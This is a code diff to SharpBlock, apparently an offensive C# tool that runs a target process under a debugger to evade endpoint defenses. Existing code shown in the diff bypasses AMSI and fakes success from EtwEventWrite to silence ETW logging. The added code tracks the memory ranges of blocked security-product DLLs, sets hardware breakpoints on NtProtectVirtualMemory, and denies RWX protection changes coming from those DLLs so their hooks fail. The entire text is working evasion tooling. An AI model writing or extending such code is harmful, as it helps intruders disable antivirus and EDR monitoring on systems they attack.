@@ -28,8 +28,10 @@ namespace SharpBlock {
         static Execute.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemorySysCall;
 
         static Program() {
-            NtWriteVirtualMemorySysCall = GetDelagateForSysCall<Execute.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory>(Execute.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory"));
-            NtProtectVirtualMemorySysCall = GetDelagateForSysCall<Execute.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory>(Execute.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory"));
+            if (IntPtr.Size == 8) {
+                NtWriteVirtualMemorySysCall = GetDelagateForSysCall<Execute.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory>(Execute.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory"));
+                NtProtectVirtualMemorySysCall = GetDelagateForSysCall<Execute.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory>(Execute.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory"));
+            }
         }
 
         static D GetDelagateForSysCall<D>(IntPtr syscallStub) where D : Delegate {
@@ -48,6 +50,7 @@ namespace SharpBlock {
         static List<string> blockDescription = new List<string>();
         static List<string> blockCopyright = new List<string>();
         static List<string> blockProduct = new List<string>();
+        static List<Tuple<long,long>> blockAddressRanges = new List<Tuple<long, long>>();
 
         static IntPtr amsiInitalizePtr;
         static IntPtr getCommandLineWPtr;
@@ -118,6 +121,11 @@ namespace SharpBlock {
             }            
         }
 
+        static bool IsInBlockedRange(long address) {
+            var result = blockAddressRanges.Where(range => address >= range.Item1 && address < range.Item2).FirstOrDefault();
+            return result != null;
+        }
+
         static string PatchEntryPointIfNeeded(IntPtr moduleHandle, IntPtr imageBase, IntPtr hProcess) {
 
             long fileSize;
@@ -151,20 +159,26 @@ namespace SharpBlock {
 
             UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
             IntPtr entryPoint;
+            long sizeOfImage;
             if ((fileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE) == IMAGE_FILE_32BIT_MACHINE) {
                 PE.IMAGE_OPTIONAL_HEADER32 optionalHeader = (PE.IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure
                     (new IntPtr(mem.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf(typeof(PE.IMAGE_FILE_HEADER))), typeof(PE.IMAGE_OPTIONAL_HEADER32));
 
                 entryPoint = new IntPtr(optionalHeader.AddressOfEntryPoint + imageBase.ToInt32());
+                sizeOfImage = optionalHeader.SizeOfImage;
 
             } else {
                 PE.IMAGE_OPTIONAL_HEADER64 optionalHeader = (PE.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure
                     (new IntPtr(mem.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf(typeof(PE.IMAGE_FILE_HEADER))), typeof(PE.IMAGE_OPTIONAL_HEADER64));
 
                 entryPoint = new IntPtr(optionalHeader.AddressOfEntryPoint + imageBase.ToInt64());
+                sizeOfImage = optionalHeader.SizeOfImage;
             }
 
             if (ShouldBlockDLL(dllPath.ToString())) {
+
+                Tuple<long, long> addressRange = new Tuple<long, long>((long)imageBase, (long)imageBase + sizeOfImage);
+                blockAddressRanges.Add(addressRange);
 
                 Console.WriteLine($"[+] Blocked DLL {dllPath}");
 
@@ -657,6 +671,20 @@ namespace SharpBlock {
             }
         }
 
+        private static void BlockVirtualProtect(IntPtr hThread, IntPtr hProcess) {
+
+            Context ctx = ContextFactory.Create(ContextFlags.All);
+            ctx.GetContext(hThread);
+
+            long returnAddress = (long)ctx.GetCurrentReturnAddress(hProcess);
+            long protection = ctx.GetParameter(3, hProcess);
+
+            if (protection == 0x40 && IsInBlockedRange(returnAddress)) {
+                Console.WriteLine("[+] Attempt to change memory to RWX from blocked DLL denied");
+                OverrideReturnValue(hThread, hProcess, new UIntPtr(0xC0000022), 5);               
+            }                
+        }
+
         static void StdOutReader(StreamReader sr) {
 
             try {
@@ -731,6 +759,7 @@ namespace SharpBlock {
 
                 IntPtr ntdllBase = WinAPI.LoadLibrary("ntdll.dll");
                 IntPtr etwEventWritePtr = WinAPI.GetProcAddress(ntdllBase, "EtwEventWrite");
+                IntPtr ntProtectVirtualMemoryPtr = WinAPI.GetProcAddress(ntdllBase, "NtProtectVirtualMemory");
 
                 Console.WriteLine($"[+] in-proc amsi 0x{amsiBase.ToInt64():x16}");
                 Console.WriteLine($"[+] in-proc ntdll 0x{ntdllBase.ToInt64():x16}");
@@ -796,6 +825,8 @@ namespace SharpBlock {
                                 if (bypassAmsi)
                                     SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, amsiInitalizePtr, 0);
 
+                                SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, ntProtectVirtualMemoryPtr, 3);
+
                                 break;
                             case WinAPI.CREATE_THREAD_DEBUG_EVENT:
                                 WinAPI.CREATE_THREAD_DEBUG_INFO CreateThreadDebugInfo = (WinAPI.CREATE_THREAD_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.CREATE_THREAD_DEBUG_INFO));
@@ -807,6 +838,8 @@ namespace SharpBlock {
 
                                     if(bypassETW)
                                         SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], etwEventWritePtr, 2);
+
+                                    SetHardwareBreakpoint(CreateThreadDebugInfo.hThread, ntProtectVirtualMemoryPtr, 3);
                                 }
 
                                 break;
@@ -882,6 +915,11 @@ namespace SharpBlock {
                                     }else if(ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == etwEventWritePtr) {
                                         //We have hit EtwEventWrite so lets just return with a fake success result
                                         OverrideReturnValue(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId], new UIntPtr(0), 5);
+                                    }else if(ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == ntProtectVirtualMemoryPtr) {
+                                        BlockVirtualProtect(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId]);
+                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], ntProtectVirtualMemoryPtr, 3);
+                                    } else {
+                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], ntProtectVirtualMemoryPtr, 3);
                                     }
 
                                 } else {
